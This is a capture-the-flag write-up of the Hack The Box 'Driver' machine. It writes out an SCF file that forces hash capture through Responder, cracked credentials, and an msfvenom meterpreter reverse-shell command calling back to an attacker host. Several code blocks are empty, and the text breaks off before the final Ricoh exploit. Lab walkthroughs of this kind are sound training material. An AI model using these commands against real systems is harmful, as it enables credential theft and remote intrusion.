## Summary
This quite an interesting easy box, or at least the foothold step is. It starts out with using an scf file to force the target system to connect to the attacker system when opened. The attacker system usse responder to steal the NTLM hash of the user trying to connect. From there however it quite straight forward to get root access on the system meterpreter. 

## Foothold
Let's start out by doing a port scan with nmap:
```console

```
The port scan shows that it is a Windows machine, hosting a web application on port 80, as well as SMB on port 445 and RPC on port 135.

Visiting the web application we get greeted with a password prompt. 
Since this is an easy box, we should try default credentials. The credentials admin:admin allows us to login to the site.

The only tab we can naigate to is the "upload firmware" tab.

As can be seen, it is mentioned that the uploaded software will be manually reviewed. I found the following [blogpost](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) which describes how a writeable SMB share can be leveraged into hosting an scf file, which when viewed will execute some limited commands. This can be used to force the target system into requesting a resource from our machine, and we can then use responder to capture the hashes of the users trying to access the resource. 
We first setuo responder:
```console
┌──(bitis㉿workstation)-[~/htb/Machines/Driver]
└─$ sudo responder -w -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

```
We then use the upload functionality on the website to upload a scf file with the following content: 
```console
[Shell]
Command=2
IconFile=\\10.10.17.182\share\based.ico
[Taskbar]
Command=ToggleDesktop 
```
We then capture the hash of the tony user:
![Responder output capturing the hash of the tony user](hash.png)
The captured hash is an NTLMv2 hash, and can be cracked with hashcat.
```console

We now have the credentials `tony:liltony`.
We can then proceed to login as the tony user via `evil-winrm`:
```console
┌──(bitis㉿workstation)-[~/htb/Machines/Driver]
└─$ evil-winrm -i 10.129.84.206 -u tony -p liltony 

Evil-WinRM shell v3.3

```
## Privilege escalation
As we saw in the [Devel box](https://bitisg.github.io/posts/Devel/), a meterpreter session on a Windows system can be very helpful when it comes to exploiting the system. We'll prepare a meterpreter revershell via msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.182 LPORT=1337 -f exe > evil.exe`
We will then upload the payload generated by msfvenom via evil-winrm:
```console
*Evil-WinRM* PS C:\Users\tony\Documents> upload evil.exe
Info: Uploading evil.exe to C:\Users\tony\Documents\evil.exe

                                                             
Data: 98400 bytes of 98400 bytes copied

Info: Upload successful!
```
We then setup a meterpreter listener in metasploit
```console
┌──(bitis㉿workstation)-[~/htb/Machines/Driver]

Based on the sysinfo command we can tell the system is running on x64 architecture.
```console
meterpreter > sysinfo

We can use the ricoh exploit to get root access:
```console
